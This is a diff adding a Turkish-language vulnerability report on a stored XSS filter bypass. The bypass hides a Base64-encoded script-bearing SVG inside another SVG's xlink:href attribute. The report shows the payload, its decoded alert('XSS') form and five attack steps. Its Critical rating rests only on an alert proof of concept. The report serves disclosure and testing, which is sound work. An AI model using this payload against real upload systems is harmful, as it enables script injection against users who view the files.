@@ -1,0 +1,35 @@
+# SVG Base64 XSS Güvenlik Açığı Analizi 🛡️
+
+## Özet
+**Önem Derecesi**: Kritik (CVSS: 9.1)
+**Durum**: Doğrulandı
+**Test Tarihi**: 20-03-2025 
+
+## Açık Detayı
+SVG dosyası içerisinde Base64 ile kodlanmış zararlı JavaScript kodu, XSS filtreleme mekanizmalarını bypass edebiliyor.
+
+### Teknik Detaylar
+
+#### Kullanılan Payload
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+"/>
+</svg>
+
+
+2-Base64 Decode Edilmiş Hali
+
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert('XSS')</script>
+</svg>
+
+
+### Saldırı Vektörü
+1. Saldırgan, zararlı JavaScript kodunu içeren bir SVG hazırlar
+2. Bu SVG'yi Base64 ile kodlar
+3. Kodlanmış içeriği başka bir SVG'nin xlink:href özelliğine yerleştirir
+4. Dosya yükleme sistemine gönderir
+5. Kurban dosyayı görüntülediğinde JavaScript kodu çalışır
+
+
+
